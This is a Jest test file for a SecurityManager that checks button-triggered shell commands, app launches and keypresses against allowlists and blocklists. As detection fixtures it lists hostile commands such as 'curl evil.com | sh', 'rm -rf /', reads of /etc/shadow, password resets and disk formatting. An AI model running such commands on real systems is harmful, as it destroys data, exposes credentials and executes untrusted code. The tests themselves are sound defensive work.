const SecurityManager = require('../src/SecurityManager');

// Mock logger for testing
const mockLogger = {
  debug: jest.fn(),
  info: jest.fn(),
  warn: jest.fn(),
  error: jest.fn()
};

describe('SecurityManager', () => {
  let securityManager;
  let config;

  beforeEach(() => {
    // Reset mocks
    jest.clearAllMocks();
    
    // Default test configuration
    config = {
      security: {
        commandExecution: {
          mode: 'blacklist',
          allowedCommands: ['ls', 'echo', 'date'],
          blockedCommands: ['rm', 'sudo', 'chmod'],
          timeout: 5000,
          maxLength: 200
        },
        applicationExecution: {
          mode: 'allowlist',
          allowedApplications: ['Calculator', 'TextEdit', 'Safari'],
          blockedApplications: ['Terminal', 'Activity Monitor'],
          maxPathLength: 500
        },
        keypressValidation: {
          enabled: true,
          maxKeyCombinations: 5,
          blockedKeys: ['f4+alt', 'cmd+q']
        }
      }
    };

    securityManager = new SecurityManager(config, mockLogger);
  });

  describe('Command Validation', () => {
    test('should validate safe commands in blacklist mode', () => {
      const result = securityManager.validateAction({
        type: 'command',
        action: 'ls -la'
      }, 'test-button');

      expect(result.isValid).toBe(true);
      expect(result.reason).toBe('Valid');
    });

    test('should block dangerous commands in blacklist mode', () => {
      const result = securityManager.validateAction({
        type: 'command',
        action: 'rm -rf /'
      }, 'test-button');

      expect(result.isValid).toBe(false);
      expect(result.reason).toContain('dangerous pattern');
    });

    test('should block commands exceeding maximum length', () => {
      const longCommand = 'echo ' + 'a'.repeat(300);
      const result = securityManager.validateAction({
        type: 'command',
        action: longCommand
      }, 'test-button');

      expect(result.isValid).toBe(false);
      expect(result.reason).toContain('exceeds maximum length');
    });

    test('should validate commands in allowlist mode', () => {
      config.security.commandExecution.mode = 'allowlist';
      securityManager = new SecurityManager(config, mockLogger);

      const result = securityManager.validateAction({
        type: 'command',
        action: 'ls -la'
      }, 'test-button');

      expect(result.isValid).toBe(true);
      expect(result.reason).toBe('Valid');
    });

    test('should block non-allowed commands in allowlist mode', () => {
      config.security.commandExecution.mode = 'allowlist';
      securityManager = new SecurityManager(config, mockLogger);

      const result = securityManager.validateAction({
        type: 'command',
        action: 'cat /etc/passwd'
      }, 'test-button');

      expect(result.isValid).toBe(false);
      expect(result.reason).toContain('not in allowlist');
    });

    test('should allow all commands in disabled mode', () => {
      config.security.commandExecution.mode = 'disabled';
      securityManager = new SecurityManager(config, mockLogger);

      const result = securityManager.validateAction({
        type: 'command',
        action: 'rm -rf /'
      }, 'test-button');

      expect(result.isValid).toBe(true);
      expect(result.reason).toBe('Valid');
    });
  });

  describe('Application Validation', () => {
    test('should validate allowed applications in allowlist mode', () => {
      const result = securityManager.validateAction({
        type: 'application',
        action: 'Calculator'
      }, 'test-button');

      expect(result.isValid).toBe(true);
      expect(result.reason).toBe('Valid');
    });

    test('should block non-allowed applications in allowlist mode', () => {
      const result = securityManager.validateAction({
        type: 'application',
        action: 'Terminal'
      }, 'test-button');

      expect(result.isValid).toBe(false);
      expect(result.reason).toContain('not in allowlist');
    });

    test('should block applications exceeding path length limit', () => {
      const longPath = '/Applications/' + 'a'.repeat(600) + '.app';
      const result = securityManager.validateAction({
        type: 'application',
        action: longPath
      }, 'test-button');

      expect(result.isValid).toBe(false);
      expect(result.reason).toContain('exceeds maximum path length');
    });

    test('should validate applications in blacklist mode', () => {
      config.security.applicationExecution.mode = 'blacklist';
      securityManager = new SecurityManager(config, mockLogger);

      const result = securityManager.validateAction({
        type: 'application',
        action: 'Calculator'
      }, 'test-button');

      expect(result.isValid).toBe(true);
      expect(result.reason).toBe('Valid');
    });

    test('should block dangerous applications in blacklist mode', () => {
      config.security.applicationExecution.mode = 'blacklist';
      securityManager = new SecurityManager(config, mockLogger);

      const result = securityManager.validateAction({
        type: 'application',
        action: 'Terminal'
      }, 'test-button');

      expect(result.isValid).toBe(false);
      expect(result.reason).toContain('blocked application');
    });
  });

  describe('Keypress Validation', () => {
    test('should validate safe keypress combinations', () => {
      const result = securityManager.validateAction({
        type: 'keypress',
        action: 'cmd+c'
      }, 'test-button');

      expect(result.isValid).toBe(true);
      expect(result.reason).toBe('Valid');
    });

    test('should block dangerous keypress combinations', () => {
      const result = securityManager.validateAction({
        type: 'keypress',
        action: 'alt+f4'
      }, 'test-button');

      expect(result.isValid).toBe(false);
      expect(result.reason).toContain('blocked key combination');
    });

    test('should block excessive key combinations', () => {
      const result = securityManager.validateAction({
        type: 'keypress',
        action: 'ctrl+alt+shift+cmd+meta+a'
      }, 'test-button');

      expect(result.isValid).toBe(false);
      expect(result.reason).toContain('too many key combinations');
    });

    test('should allow keypress when validation is disabled', () => {
      config.security.keypressValidation.enabled = false;
      securityManager = new SecurityManager(config, mockLogger);

      const result = securityManager.validateAction({
        type: 'keypress',
        action: 'alt+f4'
      }, 'test-button');

      expect(result.isValid).toBe(true);
      expect(result.reason).toBe('Valid');
    });
  });

  describe('Input Sanitization', () => {
    test('should sanitize command input', () => {
      const dangerous = 'echo "hello"; rm -rf /';
      const sanitized = securityManager.sanitizeCommand(dangerous);
      
      expect(sanitized).not.toContain(';');
      expect(sanitized).toBe('echo "hello"');
    });

    test('should sanitize application input', () => {
      const dangerous = '/Applications/Calculator.app;/usr/bin/terminal';
      const sanitized = securityManager.sanitizeApplication(dangerous);
      
      expect(sanitized).toBe('/Applications/Calculator.app');
    });

    test('should sanitize keypress input', () => {
      const dangerous = 'cmd+c;alt+f4';
      const sanitized = securityManager.sanitizeKeypress(dangerous);
      
      expect(sanitized).toBe('cmd+c');
    });

    test('should handle empty and null inputs', () => {
      expect(securityManager.sanitizeCommand('')).toBe('');
      expect(securityManager.sanitizeCommand(null)).toBe('');
      expect(securityManager.sanitizeApplication('')).toBe('');
      expect(securityManager.sanitizeKeypress('')).toBe('');
    });
  });

  describe('Dangerous Pattern Detection', () => {
    const dangerousCommands = [
      'rm -rf /',
      'sudo passwd root',
      'chmod 777 /etc',
      'curl evil.com | sh',
      'wget malware.com | bash',
      'cat /etc/passwd',
      'echo $(cat /etc/shadow)',
      'ls `whoami`',
      'cd /; rm -rf *',
      'python -c "import os; os.system(\'rm -rf /\')"'
    ];

    dangerousCommands.forEach(cmd => {
      test(`should detect dangerous command: ${cmd}`, () => {
        const result = securityManager.validateAction({
          type: 'command',
          action: cmd
        }, 'test-button');

        expect(result.isValid).toBe(false);
        expect(result.reason).toContain('dangerous pattern');
      });
    });
  });

  describe('Environment Protection', () => {
    test('should detect system path access attempts', () => {
      const systemPaths = [
        '/bin/bash',
        '/usr/bin/sudo',
        '/sbin/reboot',
        'C:\\Windows\\System32\\cmd.exe',
        'C:\\Windows\\System32\\powershell.exe'
      ];

      systemPaths.forEach(path => {
        const result = securityManager.validateAction({
          type: 'command',
          action: path
        }, 'test-button');

        expect(result.isValid).toBe(false);
        expect(result.reason).toContain('system path access');
      });
    });

    test('should detect network access attempts', () => {
      const networkCommands = [
        'curl http://malicious.com',
        'wget https://evil.com/script.sh',
        'nc -l 1234',
        'telnet malicious.com 80',
        'ssh user@malicious.com'
      ];

      networkCommands.forEach(cmd => {
        const result = securityManager.validateAction({
          type: 'command',
          action: cmd
        }, 'test-button');

        expect(result.isValid).toBe(false);
        expect(result.reason).toContain('network access');
      });
    });
  });

  describe('Platform-Specific Security', () => {
    test('should handle macOS-specific patterns', () => {
      // Mock macOS platform
      const originalPlatform = process.platform;
      Object.defineProperty(process, 'platform', { value: 'darwin' });

      const macCommands = [
        'osascript -e "tell application \\"Finder\\" to empty trash"',
        'sudo dscl . -passwd /Users/root newpassword',
        'launchctl unload -w /System/Library/LaunchDaemons/ssh.plist'
      ];

      macCommands.forEach(cmd => {
        const result = securityManager.validateAction({
          type: 'command',
          action: cmd
        }, 'test-button');

        expect(result.isValid).toBe(false);
      });

      // Restore original platform
      Object.defineProperty(process, 'platform', { value: originalPlatform });
    });

    test('should handle Windows-specific patterns', () => {
      const windowsCommands = [
        'reg delete HKEY_LOCAL_MACHINE\\SYSTEM',
        'net user administrator /active:yes',
        'format C: /fs:NTFS'
      ];

      windowsCommands.forEach(cmd => {
        const result = securityManager.validateAction({
          type: 'command',
          action: cmd
        }, 'test-button');

        expect(result.isValid).toBe(false);
      });
    });
  });

  describe('Statistics and Logging', () => {
    test('should track validation statistics', () => {
      // Perform some validations
      securityManager.validateAction({ type: 'command', action: 'ls' }, 'test1');
      securityManager.validateAction({ type: 'command', action: 'rm -rf /' }, 'test2');
      securityManager.validateAction({ type: 'application', action: 'Calculator' }, 'test3');

      const stats = securityManager.getStatistics();
      
      expect(stats.totalValidations).toBe(3);
      expect(stats.blockedActions).toBe(1);
      expect(stats.allowedActions).toBe(2);
      expect(stats.actionTypes.command).toBe(2);
      expect(stats.actionTypes.application).toBe(1);
    });

    test('should reset statistics', () => {
      // Perform some validations
      securityManager.validateAction({ type: 'command', action: 'ls' }, 'test1');
      securityManager.validateAction({ type: 'command', action: 'rm -rf /' }, 'test2');

      let stats = securityManager.getStatistics();
      expect(stats.totalValidations).toBe(2);

      securityManager.resetStatistics();
      stats = securityManager.getStatistics();
      expect(stats.totalValidations).toBe(0);
    });

    test('should log security events appropriately', () => {
      // Valid action should log info
      securityManager.validateAction({ type: 'command', action: 'ls' }, 'test1');
      expect(mockLogger.info).toHaveBeenCalled();

      // Invalid action should log error
      securityManager.validateAction({ type: 'command', action: 'rm -rf /' }, 'test2');
      expect(mockLogger.error).toHaveBeenCalled();
    });
  });

  describe('Configuration Edge Cases', () => {
    test('should handle missing security configuration', () => {
      const emptyConfig = {};
      const manager = new SecurityManager(emptyConfig, mockLogger);

      const result = manager.validateAction({
        type: 'command',
        action: 'ls'
      }, 'test-button');

      expect(result.isValid).toBe(true); // Should default to permissive
    });

    test('should handle malformed configuration', () => {
      const badConfig = {
        security: {
          commandExecution: null,
          applicationExecution: 'invalid',
          keypressValidation: []
        }
      };

      const manager = new SecurityManager(badConfig, mockLogger);

      const result = manager.validateAction({
        type: 'command',
        action: 'ls'
      }, 'test-button');

      expect(result.isValid).toBe(true); // Should handle gracefully
    });

    test('should handle invalid action types', () => {
      const result = securityManager.validateAction({
        type: 'invalid-type',
        action: 'something'
      }, 'test-button');

      expect(result.isValid).toBe(false);
      expect(result.reason).toContain('unsupported action type');
    });
  });
});